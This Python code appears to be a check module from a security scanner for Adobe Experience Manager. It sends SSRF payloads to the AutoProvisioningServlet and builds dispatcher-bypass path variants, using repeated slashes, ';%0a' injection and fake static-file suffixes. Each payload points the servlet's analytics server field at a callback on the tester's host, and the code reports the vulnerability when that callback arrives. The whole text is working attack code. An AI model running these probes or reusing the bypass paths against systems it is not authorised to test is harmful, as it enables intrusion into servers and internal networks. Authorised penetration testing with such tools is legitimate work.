import concurrent.futures
import itertools
import json
import datetime
import traceback
import sys
import argparse
import base64
import time
from collections import namedtuple
from http.server import BaseHTTPRequestHandler, HTTPServer
from random import choice, randint
from string import ascii_letters
from threading import Thread
import requests


@register('autoprovisioning_servlet')
def ssrf_autoprovisioning_servlet(base_url, my_host, debug=False, proxy=None):
    global token, d
    results = []
    AUTOPROVISIONING1 = itertools.product(('/libs/cq/cloudservicesprovisioning/content/autoprovisioning', '///libs///cq///cloudservicesprovisioning///content///autoprovisioning'), ('.json', '.4.2.1...json', '.1.json', '.html', '.html/a.1.json', '.html/a.4.2.1...json'))
    AUTOPROVISIONING1 = list(('{0}{1}'.format(p1, p2) for (p1, p2) in AUTOPROVISIONING1))
    AUTOPROVISIONING2 = itertools.product(('/libs/cq/cloudservicesprovisioning/content/autoprovisioning', '///libs///cq///cloudservicesprovisioning///content///autoprovisioning'), ('.json;%0a{0}.css', '.json;%0a{0}.png', '.html;%0a{0}.css', '.html;%0a{0}.png', '.json/{0}.css', '.json/{0}.js', '.json/{0}.png', '.json/a.gif', '.html/{0}.css', '.html/{0}.js', '.html/{0}.png', '.json/{0}.html'))
    cache_buster = random_string()
    AUTOPROVISIONING2 = list(('{0}{1}'.format(p1, p2.format(cache_buster)) for (p1, p2) in AUTOPROVISIONING2))
    AUTOPROVISIONING3 = itertools.product(('/libs/cq/cloudservicesprovisioning/content/autoprovisioning', '///libs///cq///cloudservicesprovisioning///content///autoprovisioning'), ('.{0}.css', '.{0}.js', '.{0}.ico', '.{0}.png', '.{0}.jpeg', '.{0}.gif'))
    cache_buster = randint(1, (2 ** 12))
    AUTOPROVISIONING3 = list(('{0}{1}'.format(p1, p2.format(cache_buster)) for (p1, p2) in AUTOPROVISIONING3))
    for path in itertools.chain(AUTOPROVISIONING1, AUTOPROVISIONING2, AUTOPROVISIONING3):
        url = normalize_url(base_url, path)
        enc_orig_url = base64.b16encode(url.encode()).decode()
        back_url = 'http://{0}/{1}/autoprovisioning/{2}/'.format(my_host, token, enc_orig_url)
        data = 'servicename=analytics&analytics.server={0}&analytics.company=1&analytics.username=2&analytics.secret=3&analytics.reportsuite=4'
        data = data.format(back_url)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url}
        try:
            http_request(url, 'POST', data=data, additional_headers=headers, proxy=proxy, debug=debug)
        except:
            if debug:
                error('Exception while performing a check', check='ssrf_autoprovisioning_servlet', url=url)
    time.sleep(10)
    if ('autoprovisioning' in d):
        u = base64.b16decode(d.get('autoprovisioning')[0]).decode()
        f = Finding('AutoProvisioningServlet', u, 'SSRF via AutoProvisioningServlet was detected. It might result in RCE - https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=87')
        results.append(f)
    return results
